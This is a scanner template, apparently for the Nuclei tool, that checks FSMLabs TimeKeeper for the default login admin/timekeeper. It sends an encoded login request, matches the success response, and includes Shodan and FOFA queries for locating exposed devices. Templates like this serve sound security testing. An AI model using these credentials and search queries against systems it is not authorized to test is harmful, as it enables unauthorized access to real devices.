http:
- attack: pitchfork
  matchers:
  - part: body
    type: word
    words:
    - '%7B%20%22username%22%20%3A%20%22admin%22%2C%20%22result%22%3A%20%22OK%22'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - timekeeper
    username:
    - admin
  raw:
  - 'GET /login?arg1={{url_encode(base64(username))}}&arg2={{url_encode(base64(password))}}
    HTTP/1.1

    Host: {{Hostname}}

    '
id: timekeeper-default-login
info:
  author: theamanrawat
  description: 'TimeKeeper contains default credentials. An attacker can obtain access
    to user accounts and access sensitive information, modify data, and/or execute
    unauthorized operations.

    '
  metadata:
    fofa-query: icon_hash=2134367771
    max-request: 1
    product: timekeeper
    shodan-query: http.favicon.hash:2134367771
    vendor: fsmlabs
    verified: true
  name: TimeKeeper - Default Login
  reference:
  - https://fsmlabs.com
  severity: high
  tags: timekeeper,default-login,vuln
